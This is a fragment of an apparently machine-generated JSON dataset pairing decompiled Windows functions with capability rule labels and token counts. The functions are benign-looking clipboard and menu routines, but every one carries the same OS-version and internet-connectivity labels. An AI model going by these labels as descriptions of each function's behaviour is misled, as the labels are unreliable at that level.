        "decompiled_code": "\nvoid fcn.0043099c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hMem;\n    uint var_4h;\n    \n    uStack20 = 0x4309b0;\n    (**(*in_EAX + 0x18))();\n    uStack20 = 1;\n    puStack24 = 0x4309b7;\n    iVar1 = sub.user32.dll_GetClipboardData();\n    uStack28 = 0x430a0e;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (iVar1 == 0) {\n        iStack36 = 0x4309e9;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040546c();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_GlobalLock();\n        fcn.00405664();\n        iStack36 = iVar1;\n    }\n    *in_FS_OFFSET = iStack36;\n    uStack28 = 0x430a15;\n    if (iVar1 != 0) {\n        iStack32 = iVar1;\n        sub.kernel32.dll_GlobalUnlock();\n    }\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 332
    },
    "00430c34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00430c34(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x430c48;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x430ca9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004307f4();\n    var_10h = 0;\n    fcn.00426c80(&fcn.00430c34::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x430cb0);\n    return;\n}\n",
        "token_count": 296
    },
    "00430cb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430cb8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x430ccc;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x430d2d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004307f4();\n    var_10h = 0;\n    (**(*param_2 + 0x60))(&fcn.00430cb8::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x430d34);\n    return;\n}\n",
        "token_count": 313
    },
    "00430e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00430e94(void)\n\n{\n    if (*0x497bc0 == 0) {\n        *0x497bc0 = fcn.00404610();\n    }\n    return *0x497bc0;\n}\n",
        "token_count": 54
    },
    "004310b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004310b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x497bec != NULL) {\n        iVar2 = (**0x497bec)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x004310dc;\n        }\n    }\n    uVar1 = 0;\ncode_r0x004310dc:\n    return -uVar1;\n}\n",
        "token_count": 147
    },
    "004310e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004310e4(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x497bf0 != NULL) {\n        iVar2 = (**0x497bf0)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00431104;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00431104:\n    return -uVar1;\n}\n",
        "token_count": 120
    },
    "004315e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004315e8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((in_EAX != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        if (*0x497c00 == 0) {\n            *0x497c00 = sub.user32.dll_RegisterWindowMessageA(0x43162c);\n        }\n        uVar1 = fcn.00450f7c(0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 == 100;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00431640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00431640(void)\n\n{\n    if (*0x497bfc == 0) {\n        *0x497bfc = (**(*0x491388 + 4))();\n    }\n    return *0x497bfc;\n}\n",
        "token_count": 57
    },
    "00431708": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00431708(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x4926e4)(0, *((param_2 & 0x7f) * 4 + 0x491390));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 172
    },
    "00431748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00431748(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00431848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431848(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.00431708(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x4926c0)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x4928e4)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00431e80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431e80(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.00431774();\n    }\n    uVar1 = fcn.0042ed90();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 83
    },
    "00431e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00431e9c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (in_EAX == 0) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        fcn.00431640();\n        cVar1 = fcn.00431748();\n        if (cVar1 == '\\0') goto code_r0x00431eb9;\ncode_r0x00431ee3:\n        uVar2 = 1;\n    }\n    else {\ncode_r0x00431eb9:\n        if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n            fcn.00431640();\n            cVar1 = fcn.00431748();\n            if ((cVar1 != '\\0') && (cVar1 = fcn.004315e8(),  cVar1 == '\\0')) goto code_r0x00431ee3;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 269
    },
    "00431ee8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431ee8(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x431f2d;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497bf8 = *0x497bf8 + 1;\n    if (*0x497bf8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4925d4 == '\\0') {\n            fcn.00404640();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.0040546c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 200
    },
    "00432f58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x004330c9)\n// WARNING: Removing unreachable block (ram,0x004330d6)\n// WARNING: Removing unreachable block (ram,0x004330e3)\n// WARNING: Removing unreachable block (ram,0x004330e9)\n// WARNING: Removing unreachable block (ram,0x004330f6)\n// WARNING: Removing unreachable block (ram,0x004330fc)\n// WARNING: Removing unreachable block (ram,0x00433109)\n\nvoid fcn.00432f58(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00432f58::var_2h + 2;\n    uStack32 = 0x433137;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x004330c3;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405654();\n            goto code_r0x004330c3;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00405654();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00405654();\n            goto code_r0x004330c3;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00432f58::var_2h + 2;\n            fcn.00409ce8();\n            fcn.00405784();\n            goto code_r0x004330c3;\n        }\n    }\n    puStack28 = &fcn.00432f58::var_2h + 2;\n    fcn.00432f04();\ncode_r0x004330c3:\n    fcn.0040546c();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43313e;\n    uStack32 = 0x433136;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 899
    },
    "0043333c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0043333c(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.004359b8();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.004359c8();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 240
    },
    "004333a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004333a0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.004359b8();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.004359b8();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.004359c8();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.004359c8();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.0043333c(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.0043333c(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.004359c8(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.004359c8(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "00433838": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00433838(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.0043331c();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00404610();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x436328;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 331
    },
    "00433968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433968(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x433bb9;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x00433b9b;\n    fcn.00405504();\n    iVar4 = fcn.004359b8();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004047cc();\n                if (cVar3 != '\\0') goto code_r0x00433a04;\n            }\n            fcn.00432f58(0x433bd0, var_4h);\n            fcn.00405800(0);\n        }\n    }\n    else {\n        var_22h = fcn.00433e6c();\n    }\ncode_r0x00433a04:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.00405894();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x491468) |\n                *(*(in_EAX + 0x48) * 4 + 0x49145c) | *(*(in_EAX + 0x38) * 4 + 0x49144c) |\n                *(*(in_EAX + 0x39) * 4 + 0x491454);\n        iVar4 = fcn.004359b8();\n        if (iVar4 < 1) {\n            uVar5 = fcn.004058fc();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.004058fc();\n            uVar5 = fcn.00433e6c(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x00433b9b;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.00435f78();\n    if (iVar4 == 0) {\ncode_r0x00433a44:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x00433a5a;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.0043558c();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x00433a44;\n        }\ncode_r0x00433a5a:\n        var_6h = 1;\n    }\n    fcn.00405894();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x49149c) | *(*(in_EAX + 0x3d) * 4 + 0x491494) | *(*(in_EAX + 0x48) * 4 + 0x491470)\n              | *(var_5h * 4 + 0x4914a4) | *(var_6h * 4 + 0x4914ac);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x49147c) | *(*(in_EAX + 0x39) * 4 + 0x49148c) |\n              *(*(in_EAX + 0x3a) * 4 + 0x491484);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.004058fc();\n    iVar4 = fcn.004359b8();\n    if (0 < iVar4) {\n        var_22h = fcn.00433e6c();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x00433b9b:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.0040546c(0x433bc0);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1457
    },
    "00433d3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00433d3c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.00433d3c();\n        return;\n    }\n    uVar2 = fcn.00433e6c();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.00433e6c(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.00433e6c(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004047cc(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.00433e6c();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x00433dfc;\n        }\n    }\n    fcn.00433bfc();\ncode_r0x00433dfc:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 479
    },
    "00433e6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00433e6c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.00432eac();\n        }\n        fcn.00433bfc();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 189
    },
    "00434114": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434114(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "0043558c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043558c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.00435f78();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "00435608": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
